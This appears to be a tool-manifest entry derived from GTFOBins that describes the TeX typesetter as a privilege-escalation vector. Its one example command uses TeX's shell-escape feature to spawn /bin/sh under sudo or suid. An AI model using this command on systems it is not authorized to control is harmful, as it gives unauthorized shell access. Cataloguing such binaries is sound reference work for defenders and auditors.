---
id: typesetting-tex-tex
namespace: typesetting:tex:tex
name: tex
description: TeX typesetting system; can read and write files and spawn shells.
author: GTFOBins
version: 1.0.0
capabilities:
- security.privilege-escalation.shell
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- tex
parameters: []
features:
- file-system
- interactive
- local
- process-manip
- requires-root
execution:
  template: tex
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Spawn an interactive shell (sudo, suid, unprivileged)
  command: tex --shell-escape '\immediate\write18{/bin/sh}'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/tex/
techniques:
- privilege-escalation
- execution
install:
- method: apt
  package_name: texlive-base
  commands:
  - apt-get install -y texlive-base
---

# tex

tex is a command-line utility. TeX typesetting system; can also spawn an interactive shell.
